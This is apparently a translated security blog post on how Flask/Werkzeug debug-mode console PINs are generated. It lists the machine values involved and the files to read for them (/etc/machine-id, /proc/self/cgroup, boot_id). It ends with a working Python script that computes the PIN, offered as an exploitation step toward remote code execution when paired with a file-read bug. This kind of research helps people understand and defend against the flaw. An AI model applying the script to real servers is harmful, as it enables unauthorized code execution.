---
title: "Flask Debug-Mode PIN Generation Mechanism: Security Reproduction Notes"
slug: qrgqgt
translationKey: qrgqgt
date: 2020-12-06T23:45:51+08:00
source: yuque/penetration
---

> [Enabling debug mode in Flask is equivalent to leaving a backdoor for hackers](https://zhuanlan.zhihu.com/p/32138231). This article provides a brief analysis of the security issues that can arise when Flask runs with debug mode enabled in a production network. One of the more severe security issues is that arbitrary Python code can be executed in the interactive Python shell. On this point, in older versions of Flask, no PIN authentication was required to execute code — the harm of this is self-evident.
>
> In newer versions of Flask, a PIN must be entered for authentication before custom code can be executed, which makes this avenue considerably less useful for an attacker.
>
> Later, by chance, I discovered that **on the same machine, restarting the Flask service multiple times does not change the PIN value. In other words, the PIN is a fixed value** — this greatly piqued my interest.
>
> So I studied and researched the PIN generation mechanism, which led to this article.
>

This article is an extension of the one above. Some of the content recorded here may no longer apply due to version iterations, operating system differences, and so on — please verify carefully. Thanks for reading.



![](https://cdn.nlark.com/yuque/0/2020/png/166008/1607337585473-8c30d1aa-4eb3-45af-a924-3a1410d832d7.png)



# Conclusions
1. In newer versions of Flask, a PIN must be entered for authentication before you can access `/console`, and thereby execute arbitrary code (RCE);
2. <font style="color:#121212;">Flask's PIN generation mechanism is simply Werkzeug's PIN generation mechanism;</font>
3. <font style="color:#121212;">Flask's PIN depends on certain values of the runtime environment, such as the MAC address and the flask script path;</font>
4. **On the same machine, restarting the Flask service multiple times does not change the PIN value. In other words, the PIN is a fixed value;**
5. If the `/console` path is accessible, combining it with a **local file read** vulnerability may allow the PIN to be obtained, leading to RCE
6. Combined with point 2, since <font style="color:#121212;">Werkzeug adjusted the</font> `get_machine_id` method's <font style="color:#121212;">concrete implementation in early 2020</font> ([here is the specific change](https://github.com/pallets/werkzeug/commit/617309a7c317ae1ade428de48f5bc4a906c2950f#diff-83867b1c4c9b75c728654ed284dc98f7c8d4e8bd682fc31b977d122dd045178a)), when actually exploiting this you need to pay special attention to how get_machine_id is constructed

```sql
The PIN value is derived from the combination of 【current computer username: XXX】, 【flask.app】, 【Flask】, 【C:\\Python27\\lib\\site-packages\\flask\\app.pyc】, 【str(uuid.getnode())】, 【get_machine_id()】 — none can be missing.
    username # the username
    modname # flask.app
    getattr(app, '__name__', getattr(app.__class__, '__name__')) # usually defaults to flask.app being Flask
    getattr(mod, '__file__', None) # absolute path of an app.py under the flask directory
    uuid.getnode() # MAC address in decimal
    get_machine_id() # system id 【generation method depends on】

```

However, some of these variables are easy to obtain — for example, `C:\\Python27\\lib\\site-packages\\flask\\app.pyc` can very likely be obtained from the error page. Therefore, the three things that mainly require deeper digging are the following:

## Key Parameters
1. **<font style="color:#121212;">Current computer username</font>**

Omitted here

2. `**<font style="color:#121212;">str(uuid.getnode())</font>**`

```sql
>>> import uuid
>>> str(uuid.getnode())
'26801*****3893'
```

3. `**<font style="color:#121212;">get_machine_id()</font>**`

<font style="color:#4D4D4D;">Werkzeug 1.0.1's code changed on January 5, 2020, and one of those changes was an adjustment to how</font> `get_machine_id` <font style="color:#4D4D4D;">is generated</font>

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1607336698825-ab54d1bb-06b3-4c25-9065-69cc0cd7bda9.png)

Therefore, for Werkzeug installed at different times, `get_machine_id` has different implementations. For actual exploitation, the conclusions are as follows:

```markdown
# Implementation of get_machine_id
- For Werkzeug installed 【before 2020.1.5】
Reads the three files /proc/self/cgroup, /etc/machine-id, /proc/sys/kernel/random/boot_id in order; as soon as one file's content is read, the value is returned immediately.

- For Werkzeug installed 【after 2020.1.5】
Reads a value from /etc/machine-id or /proc/sys/kernel/random/boot_id and immediately breaks, then concatenates it with the id value from /proc/self/cgroup. The pseudocode is as follows:
----------------------------------------------
get_machine_id() = str(p1) + str(p2), while: 
	    # 	p1 = （`cat /etc/machine-id` OR `cat /proc/sys/kernel/random/boot_id`）#=> xxxxx
	    # 	p2 = `cat /proc/self/cgroup`.strip().rpartition(b"/")[2] #=>	user.slice
```

## EXP Exploitation Script
The following script has been tested under py3.

```python
# encoding:utf-8
import hashlib
from itertools import chain

# PIN should be 140-625-693
probably_public_bits = [
    'root',# username
    'flask.app',# modname
    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.6/site-packages/flask/app.py' # getattr(mod, '__file__', None), # /usr/local/libpython3.6/site-packages/flask
]
private_bits = [
    '345053803543',# str(uuid.getnode()),  cat /sys/class/net/eth0/address, must be converted to decimal
    '05cb8c7b39fe0f70e3ce97e5beab809duser.slice'# pseudocode of get_machine_id()
    # if Werkzeug is installed AFTER 2020.1.5 : 
    # 	get_machine_id() = str(p1) + str(p2), while
    # 		p1 = (`cat /etc/machine-id` OR `cat /proc/sys/kernel/random/boot_id`) => xxxxx
    # 		p2 = `cat /proc/self/cgroup`.strip().rpartition(b"/")[2]	=>	user.slice
    # else:
   	# 	get_machine_id() =（`cat /proc/self/cgroup` OR `cat /etc/machine-id` OR `cat /proc/sys/kernel/random/boot_id` ）
]  

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
cookie_name = '__wzd' + h.hexdigest()[:20]
num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]
rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num
print(rv)

```



Completing this article would not have been possible without the help of the articles below — many thanks to those authors!

# refs
+ [https://zhuanlan.zhihu.com/p/32336971](https://zhuanlan.zhihu.com/p/32336971)
+ [https://xz.aliyun.com/t/2553](https://xz.aliyun.com/t/2553)
+ [https://www.jianshu.com/p/cbca419ba075](https://www.jianshu.com/p/cbca419ba075)
+ [The change in Flask debug pin generation brought by the Werkzeug update](https://blog.csdn.net/q851579181q/article/details/107151492)
